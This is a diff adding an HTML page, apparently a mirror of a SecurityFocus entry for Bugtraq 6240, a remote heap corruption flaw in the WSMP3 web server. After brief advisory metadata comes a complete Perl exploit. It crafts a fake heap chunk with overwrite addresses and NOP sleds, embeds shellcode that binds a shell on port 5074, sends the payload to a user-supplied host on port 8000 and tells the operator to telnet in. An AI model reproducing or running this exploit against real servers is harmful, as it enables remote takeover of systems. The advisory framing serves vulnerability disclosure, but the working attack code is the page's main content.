@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid6240<p><b><span style="font-size: 18pt;">WSMP3 Remote Heap Corruption Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6240/info">info</a><br><a href="http://www.securityfocus.com/bid/6240/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6240/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6240/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6240/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6240
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 25 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 25 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability credited to "dong-h0un U" &lt;xploit@hackermail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WSMP3 WSMP3 0.0.2 <br/>
+					
+				
+					WSMP3 WSMP3 0.0.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x7000/6240/wsmp3xpl.c">#exploit_wsmp3xpl.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following exploit was provided by Damian Myerscough:<br/>#!/usr/bin/perl -w<br/>#<br/>#<br/># Remote Heap malloc/free &amp; multiple Overflow vulnerability in WSMP3.<br/># Bug found by; dong-h0un U<br/># Exploit Coded By; Damian Myerscough<br/>#<br/># visit: www.securityfreaks.com<br/># visit: http://x82.i21c.net<br/>#<br/># 0x02. Vulnerable Packages<br/># =-=-=-=-=-=-=-=-=-=-=-=-=<br/>#<br/># Vendor site: http://wsmp3.sourceforge.net/<br/>#<br/># web_server-0.0.6<br/># -web_server-0.0.6.tar.gz<br/># +RedHat Linux 6.x<br/># web_server-0.0.5 (exploitable)<br/># -web_server-0.0.5.tar.gz<br/># web_server-0.0.4<br/># -web_server-0.0.4.tar.gz<br/># web_server-0.0.3<br/># -web_server-0.0.3.tar.gz.gz<br/># wsmp3-0.0.2<br/># -web_server-0.0.2.tar.gz<br/># web_server-v.0.0.1<br/># -web_server.tar.gz<br/>#<br/># Tested On Redhat 6.1 (cartman)<br/>#<br/>#<br/><br/>use IO::Socket;<br/><br/>$Shellcode = "\x41\x41\x41\x41". # offset<br/>             "\x41\x41\x41\x41". # offset<br/>             "\x41\x41\x41\x41". # offset<br/>             "\x41\x41\x41\x41". # offset 16 bytes<br/>             "\xfc\xff\xff\xff". # chunk header<br/>             "\xff\xff\xff\xff". # ""<br/>             "\xa0\x1b\x05\x08". # 0x08051bac-12<br/>             "\xd0\x7b\xff\xbf". # 0xbfff7bd0<br/>             "\x20". # ' '<br/>             "\x90\x90\x90\x90\x90\x90\x90\x90". # nop<br/>             "\xeb\x0c\xeb\x0c\xeb\x0c\xeb\x0c". # nop 12 bytes jumpcode<br/>             "\x90\x90\x90\x90\x90\x90\x90\x90". # nop<br/>             "\x90\x90\x90\x90\x90\x90\x90\x90". # nop<br/>             #Shellcode Binds a port on 5074 This shellcode is 92 bytes<br/>             "\x31\xc0".<br/>             "\x50".<br/>             "\x40".<br/>             "\x89\xc3".<br/>             "\x50".<br/>             "\x40".<br/>             "\x50".<br/>             "\x89\xe1".<br/>             "\xb0\x66".<br/>             "\xcd\x80".<br/>             "\x31\xd2".<br/>             "\x52".<br/>             "\x66\x68\x13\xd2".<br/>             "\x43".<br/>             "\x66\x53".<br/>             "\x89\xe1".<br/>             "\x6a\x10".<br/>             "\x51".<br/>             "\x50".<br/>             "\x89\xe1".<br/>             "\xb0\x66".<br/>             "\xcd\x80".<br/>             "\x40".<br/>             "\x89\x44\x24\x04".<br/>             "\x43".<br/>             "\x43".<br/>             "\xb0\x66".<br/>             "\xcd\x80".<br/>             "\x83\xc4\x0c".<br/>             "\x52".<br/>             "\x52".<br/>             "\x43".<br/>             "\xb0\x66".<br/>             "\xcd\x80".<br/>             "\x93".<br/>             "\x89\xd1".<br/>             "\xb0\x3f".<br/>             "\xcd\x80".<br/>             "\x41".<br/>             "\x80\xf9\x03".<br/>             "\x75\xf6".<br/>             "\x52".<br/>             "\x68\x6e\x2f\x73\x68".<br/>             "\x68\x2f\x2f\x62\x69".<br/>             "\x89\xe3".<br/>             "\x52".<br/>             "\x53".<br/>             "\x89\xe1".<br/>             "\xb0\x0b".<br/>             "\xcd\x80";<br/><br/>print"+==========================================+\n";<br/>print" Remote Heap malloc/free WSMP3 \n";<br/>print" Coded By; Damian Myerscough \n";<br/>print" Bug found By; dong-h0un U \n";<br/>print" Offset done By; dong-h0un U \n";<br/>print"+==========================================+\n\n";<br/><br/>print"Enter a Host: ";<br/> $Host = &lt;STDIN&gt;;<br/>  chop($Host);<br/><br/># First connect.<br/>$Socket = IO::Socket::INET-&gt;new(Proto =&gt;"tcp",<br/>                                PeerAddr =&gt;$Host,<br/>                                PeerPort =&gt;8000) || die "Could not connect<br/>to $Host \n";<br/><br/>print"Sending Fake Chunk.\n";<br/>print $Socket "$Shellcode";<br/>close($Socket);<br/><br/># Second connect.<br/>$Socket = IO::Socket::INET-&gt;new(Proto =&gt;"tcp",<br/>                                PeerAddr =&gt;$Host,<br/>                                PeerPort =&gt;8000) || die "Could not connect<br/>to $Host \n";<br/>print"Sending Shellcode.\n";<br/>print $Socket "$Shellcode";<br/>close($Socket);<br/><br/>print"Binded port.\n";<br/>print"Telnet to $Host at port 5074\n";<br/><br/><br/>The following exploit was provided:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/wsmp3xpl.c">/data/vulnerabilities/exploits/wsmp3xpl.c</a></li>
+</ul>
+</div>
